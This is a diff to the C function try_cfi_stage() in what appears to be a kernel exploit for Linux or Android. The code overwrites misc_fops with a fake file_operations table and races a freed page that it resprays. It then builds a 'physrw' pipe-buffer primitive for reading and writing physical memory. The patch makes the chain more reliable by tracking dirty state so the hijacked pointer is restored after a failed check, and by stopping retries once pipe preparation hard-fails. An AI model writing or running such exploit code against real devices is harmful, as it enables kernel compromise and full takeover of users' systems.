@@ -349,6 +349,10 @@ int try_cfi_stage(void) {
   int can_read_back = 0;
 
   if (fd < 0) {
+#if defined(APP_FOPS_AUTHORITATIVE_READBACK) && \
+    APP_FOPS_AUTHORITATIVE_READBACK
+    cfi_dirty_seen = 1;
+#endif
     cfi_last_step = 11;
     cfi_last_errno = errno;
     return 0;
@@ -358,6 +362,14 @@ int try_cfi_stage(void) {
   ssize_t pre_rb = configfs_read_once(
       fd, misc_fops, &pre_fops, sizeof(pre_fops));
   if (pre_rb != (ssize_t)sizeof(pre_fops) || pre_fops != fake_fops) {
+#if defined(APP_FOPS_AUTHORITATIVE_READBACK) && \
+    APP_FOPS_AUTHORITATIVE_READBACK
+    uint64_t expected_original_fops = canon_addr(ASHMEM_FOPS);
+    if (pre_rb == (ssize_t)sizeof(pre_fops) &&
+        pre_fops != expected_original_fops) {
+      cfi_dirty_seen = 1;
+    }
+#endif
     pr_warning("cfi misc_fops mismatch ret=%zd target=%016zx "
                "read=%016llx want=%016zx errno=%d\n",
                pre_rb, misc_fops, (unsigned long long)pre_fops,
@@ -367,6 +379,15 @@ int try_cfi_stage(void) {
     cfi_last_errno = errno;
     goto fail;
   }
+
+#if defined(APP_FOPS_AUTHORITATIVE_READBACK) && \
+    APP_FOPS_AUTHORITATIVE_READBACK
+  /* The target pointer is now proven to reference this fake table.  Any
+   * later verifier failure must restore it and must not free/respray another
+   * page as though the race had missed cleanly. */
+  dirty = 1;
+  cfi_dirty_seen = 1;
+#endif
 
   if (!audit_fake_fops_table(fd)) {
     cfi_last_step = 12;
@@ -511,6 +532,11 @@ int try_cfi_stage(void) {
             "attempt=%d/%d\n",
             pipebuf_page_base, first_leak_attempt + 1,
             PIPE_FIRST_LEAK_ATTEMPTS);
+    if (pipe_prepare_hard_failed) {
+      pr_warning("fresh physrw pipe preparation hard-failed; refusing "
+                 "unsafe retry\n");
+      break;
+    }
     if (is_direct_ptr(pipebuf_page_base)) {
       break;
     }
@@ -532,6 +558,11 @@ int try_cfi_stage(void) {
       pipebuf_page_base = prepare_pipe_buffer_page();
       pr_info("fresh physrw retry page attempt=%d/%d base=%016zx\n",
               attempt + 1, PIPE_MAX_ATTEMPTS, pipebuf_page_base);
+      if (pipe_prepare_hard_failed) {
+        pr_warning("fresh physrw retry preparation hard-failed; refusing "
+                   "additional attempts\n");
+        break;
+      }
       if (!is_direct_ptr(pipebuf_page_base)) {
         continue;
       }
